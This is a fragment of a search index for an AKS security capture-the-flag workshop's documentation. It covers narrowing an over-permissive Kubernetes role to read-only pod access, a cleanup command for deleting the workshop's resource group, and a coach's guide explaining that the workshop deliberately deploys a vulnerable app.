potential security threats by detecting unauthorized external processes within containers.\n</code></pre>"},{"location":"scenario_3_defense/#fix-container-permissions","title":"Fix container permissions","text":"<p>Our container was given a cluster role that was too permissive.</p> <p>https://github.com/lastcoolnameleft/aks-ctf/blob/main/workshop/manifests/omnibus.yml#L7-L14</p> <p>We got confirmation from the developer that the app needs to be able to see (but not modify) other pods in the namespace.  Let's update that role to be less permissive:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: insecure-app-role\nrules:\n- apiGroups: [\"\"] # \"\" indicates the core API group\n  resources: [\"pods\"]\n  verbs: [\"get\", \"watch\", \"list\"]\n</code></pre>"},{"location":"wrapup/","title":"Wrap-up","text":"<p>Congrats! Remember to delete your project so it won't keep running and accruing charges!</p> <p>You can delete it through the web interface, or with the following Azure CLI command:</p> <pre><code>az group delete -n $RESOURCE_GROUP\n</code></pre>"},{"location":"coach/","title":"Securing AKS Coaches Guide","text":"<p>This is a workshop designed to help operations teams understand the different security options inside Azure for AKS.  </p>"},{"location":"coach/#getting-started","title":"Getting Started","text":"<p>You and each participant should be aware that:   * This workshops intentionally deploys an insecure app which will have a vulnerability that can be exploited to take over the cluster   * The environment should only run for as short of a time as possible.</p> <p>Perform the following: * Read and understand the narrative * Ensure each participant has the ability to create a VNET and an AKS cluster * Deploy the CTFd</p>"}]}